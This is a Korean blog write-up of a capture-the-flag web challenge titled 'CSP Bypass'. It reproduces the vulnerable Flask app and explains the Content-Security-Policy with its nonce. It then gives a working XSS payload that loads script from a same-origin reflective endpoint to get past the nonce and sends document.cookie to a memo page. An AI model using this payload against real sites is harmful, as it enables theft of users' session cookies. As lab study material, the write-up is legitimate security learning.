---
title: "[2025-08-05] CSP Bypass"
excerpt: "XSS"

categories:
  - Problem
tags:
  - [XSS]

permalink: /Problem/[2025-08-05] CSP Bypass/

toc: true
toc_sticky: true

date: 2025-08-05
last_modified_at: 2025-08-05
---

## 🦥 본문

- app.py

```
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers[
        "Content-Security-Policy"
    ] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)

app.run(host="0.0.0.0", port=8000)

```

기존의 XSS 문제들과 유사하다. 

추가된 점은 request 이후에 `add_header()` 메소드를 추가한다는 것이다.

- 다음과 같은 CSP 헤더를 추가한다
    
    ```html
    "default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce} 
    ```
    
- `nonce` 값은 보안상으로 안전한 랜덤값으로 설정한다.

`nonce` 부분을 해결하기 위해서는 외부 JS 로드를 통해 우회해야 한다. 마침 `script-src`도 `‘self’`이므로 다음과 같이 작성했다.

```html
<script src="/vuln?param=document.location='/memo?memo='+document.cookie"></script> 
```

돼야 되는 코드인데 왜 안될까 하다가 다음과 같이 풀었다.

### 풀이

```html
<script src="/vuln?param=document.location='/memo?memo='%2bdocument.cookie"></script>
```

1. 웹 드라이버에서 `<script src="… >`를 통해 실행하여 외부 JS를 가져온다
    1. 이때 src는  `document.location` 이므로 `script-src ‘self’` 를 우회
    2. 외부 JS를 로드하기 때문에 `nonce` 우회
2. `+` 가 아닌 `%2b` 로 사용
    
    왜냐하면 외부 JS를 로드할 때 자동 인코딩이 안되기 때문에 아래처럼 작동 
    
    `+` 는 URL에서 공백으로 해석되기 때문에 URL 인코딩.